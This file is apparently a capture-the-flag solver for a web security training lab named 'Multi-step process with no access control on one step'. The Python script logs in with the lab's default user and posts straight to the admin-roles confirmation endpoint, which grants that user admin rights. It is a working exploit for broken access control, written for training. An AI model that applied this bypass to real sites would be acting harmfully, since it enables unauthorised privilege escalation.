import requests
import urllib3
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Multi-step process with no access control on one step"


def run(url, payload, proxies=None):
    url = url.rstrip('/')

    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Login as wiener\n2. Upgrade wiener to be an admin bypassing the first step\n""")

    print(Fore.WHITE + "[1] Logging in as wiener")
    data = {"username": "wiener", "password": "peter"}
    login_as_wiener = requests.post(
        f"{url}/login", data=data, verify=False, allow_redirects=False, proxies=proxies)

    print(Fore.WHITE +
          "[2] Upgrading wiener to be an admin bypassing the first step")
    session = login_as_wiener.cookies.get("session")
    cookies = {"session": session}
    data = {"username": "wiener", "action": "upgrade", "confirmed": "true"}

    try:
        r = requests.post(
            f"{url}/admin-roles", data=data, cookies=cookies, verify=False, allow_redirects=False, proxies=proxies)
        return True

    except Exception as e:
        print(f"[!] Failed to fetch payload through exception")
        return False
